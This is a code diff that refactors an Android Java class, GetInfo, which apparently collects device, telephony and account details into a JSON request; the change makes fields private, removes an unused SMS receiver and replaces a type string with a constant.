@@ -13,7 +13,6 @@ import android.accounts.Account;
 import android.accounts.AccountManager;
 import android.content.Context;
 import android.content.SharedPreferences;
-import android.content.SharedPreferences.Editor;
 import android.content.pm.PackageManager;
 import android.content.res.Resources;
 import android.net.ConnectivityManager;
@@ -26,23 +25,20 @@ import android.util.DisplayMetrics;
 import android.view.WindowManager;
 
 import com.inet.android.certificate.R;
+import com.inet.android.request.ConstantRequest;
 import com.inet.android.request.RequestList;
-import com.inet.android.sms.SMSBroadcastReceiver;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
 public class GetInfo {
-	static Context mContext;
-	static SharedPreferences sp;
-	static Editor e;
-	static TelephonyManager telephonyManager;
-	static int networkType;
-	TelephonyInfo telephonyInfo;
-	private String LOG_TAG = "GetIfo";
-	String typeStr = "1";
-	SMSBroadcastReceiver sms;
-	JSONObject info;
-	Resources path;
+	private static Context mContext;
+	private static SharedPreferences sp;
+	private static TelephonyManager telephonyManager;
+	private static int networkType;
+	private TelephonyInfo telephonyInfo;
+	private String LOG_TAG = GetInfo.class.getSimpleName().toString();
+	private JSONObject info;
+	private Resources path;
 
 	public GetInfo(Context mContext) {
 		GetInfo.mContext = mContext;
@@ -99,7 +95,7 @@ public class GetInfo {
 			getAccaunt();
 
 			object.put("time", ConvertDate.logTime());
-			object.put("type", typeStr);
+			object.put("type", ConstantRequest.TYPE_INFO_REQUEST);
 			object.put("info", info);
 			// object.put("hardware", value);
 			// object.put("accaunt", value);
